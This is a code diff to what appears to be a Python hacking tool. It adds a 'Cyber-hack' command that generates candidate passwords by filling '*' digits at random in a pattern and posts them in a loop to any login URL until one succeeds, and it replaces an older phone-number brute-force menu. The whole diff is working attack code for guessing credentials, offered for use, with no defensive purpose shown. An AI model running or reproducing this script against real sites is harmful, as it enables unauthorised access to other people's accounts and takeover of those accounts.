@@ -4,6 +4,9 @@ import random,re
 from logo import showLogo
 dictionarys = []
 
+session = req.Session()
+session.headers.update({"Content-Type": "application/x-www-form-urlencoded"})
+
 def randomPhoneNumber(main):
     x = main
     while(True):
@@ -12,7 +15,7 @@ def randomPhoneNumber(main):
                 dictionarys.append(main)
                 return main
             else:
-                main = x;
+                main = x
         main += random.choice("0123456789")
 
 def jenPasswords(main):
@@ -76,10 +79,6 @@ def BruteForcePhoneNumber():
             print("Warning!!!\n",target,"\n -t Error use\":\"")
             print("=======================================================================")
             continue
-        # print(method)
-        # print(url)
-        # print(bodys)
-        # print(target)
         b1 = bodys[0].split(":")
         b2 = target[0].split(":")
         while(True):
@@ -104,14 +103,34 @@ def BruteForcePhoneNumber():
                 break
 
 showLogo()
-while(True):
-    res = input(">> ")
-    if(res=="help"):
-        print("""========================================================================================================
-\t- help \t\t :Use Commands "help" Show All Command.
-\t- BrutePhone \t :Use Commands "BrutePhone" Brute Force Attacking url.
-========================================================================================================""")
-    elif(res=="BrutePhone"):
-        BruteForcePhoneNumber()
-    elif(res=="exit"):
-        break
+print(">> Cyber-hack -u a@a.coam -p 09876***12 -url https://a.com/login")
+try:
+    while(True):
+        res = input(">> ")
+        if("Cyber-hack" in res):
+            username = re.findall("-u (.*?) ", res)
+            passwordjen = re.findall("-p (.*?) ", res)
+            url = res.split(' ')[-1]
+            while True:
+                password = str(jenPasswords(passwordjen[0]))
+                response = session.post(url,data={"username":username[0],"password":password})
+                print(f">> {password} {len(dictionarys)} {response.json()}",end="\r")
+                if response.json()["status"] == 200 and "สำเร็จ" in response.json()["message"]:
+                    print("=======================================================================")
+                    print(f">> username= {username[0]}, password= {password} login Successfully.")
+                    print("=======================================================================")
+                    dictionarys.clear()
+                    break
+        elif("help" in res or "h" in res or "-help" in res or "-h" in res):
+            print("""========================================================================================================
+    \t- help \t\t :Use Commands "help" Show All Command.
+    \t- exit \t\t :Use Commands "exit" close Cyber.
+    \t- Cyber-hack \t :Use Commands "Cyber-hack" Brute Force Attacking url.
+    \t -u \t :username.
+    \t -p \t :password Ex : -p 0987***21 will random 0-9 use "*". 
+    \t Example cmd: Cyber-hack -u a@a.com -p 09876***12 -url https://a.com/login
+    ========================================================================================================""")
+        elif(res=="exit"):
+            break
+except:
+    pass
